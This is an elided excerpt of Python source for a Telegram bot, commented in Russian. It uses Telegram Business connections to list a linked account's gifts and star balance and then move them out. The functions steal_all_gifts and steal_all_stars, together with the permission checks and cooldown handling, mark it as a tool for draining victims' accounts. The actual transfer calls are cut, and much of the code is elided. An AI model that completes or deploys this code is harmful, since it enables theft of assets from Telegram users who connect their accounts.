...
SUPER_ADMINS = {5858391454} #айди админов
...
async def check_permissions(business_connection: BusinessConnection, errors: list) -> Dict[str, Any]:
    ...
    try:
        await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
    ...
    try:
        await bot(GetFixedBusinessAccountGifts(business_connection_id=business_connection.id))
...
def get_gift_list_message(gifts: List[Gift]):
    ...
    for i, gift in enumerate(gifts):
        ...
        name = gift_info.name if gift_info.name else "Неизвестный подарок"
        stars = gift_info.star_count if gift_info.star_count is not None else 0
        number = gift_info.number if gift_info.number is not None else "None"
        
        if gift.type == "unique":
            nft_link = ""
            if gift_info.base_name and gift_info.number:
            ...
            elif gift_info.name and gift_info.name.count('-') > 0:
...
async def steal_all_gifts(connection_id: str, username: str):
    try:
        ...
        logger.info(f"Found {len(response.gifts)} gifts to process for connection {connection_id}")

        for gift in response.gifts:
            try:
                if not getattr(gift, 'can_be_transferred', False):
                    error_details.append(f"• Подарок '{getattr(gift.gift, 'name', 'Неизвестно')}' непередаваемый.")
                    skipped_count += 1
                    continue
                ...
                if next_transfer_date > current_time:
                    ...
                    error_details.append(f"• Подарок '{getattr(gift.gift, 'name', 'Неизвестно')}' на кулдауне ({cooldown} сек).")
                    skipped_count += 1
                    continue
                ...
                try:
                    ...
                    error_details.append(f"• Ошибка при передаче подарка '{getattr(gift.gift, 'name', 'Неизвестно')}': {str(e)}")
                    skipped_count += 1
                except Exception as e:
                    logger.error(f"Unexpected error transferring gift {gift.owned_gift_id}: {e}")
                    error_details.append(f"• Непредвиденная ошибка с подарком '{getattr(gift.gift, 'name', 'Неизвестно')}': {str(e)}")
                    skipped_count += 1
                ...
                error_details.append(f"• Критическая ошибка обработки подарка '{getattr(gift.gift, 'name', 'Неизвестно')}': {str(e)}")
                skipped_count += 1
...
async def steal_all_stars(connection_id: str, username: str):
    try:
        ...
        star_amount = balance_response.star_amount
...
async def gift_transfer_menu_handler(callback: CallbackQuery):
    ...
    for gift in gifts:
        gift_info = gift.gift
        gift_name = gift_info.name if gift_info.name else "Неизвестный подарок"
        if gift.type == "unique":
            gift_name = f"Уникальный: {gift_name} #{gift_info.number}"
...
async def gift_details_handler(callback: CallbackQuery, state: FSMContext):
    ...
    message_text = (
        ...
        f"• Тип: {gift.type}\n"
        f"• Количество звёзд: {details.star_count}\n"
        f"• Передаваемый: {'✅' if gift.can_be_transferred else '❌'}\n"
    )
    
    if gift.type == "unique":
        message_text += (
            f"• Уникальный номер: {details.number}\n"
            f"• Базовое имя: {details.base_name}\n"
        )
        
    if gift.next_transfer_date:
    ...
    if gift.can_be_transferred and (not gift.next_transfer_date or gift.next_transfer_date <= int(time.time())):
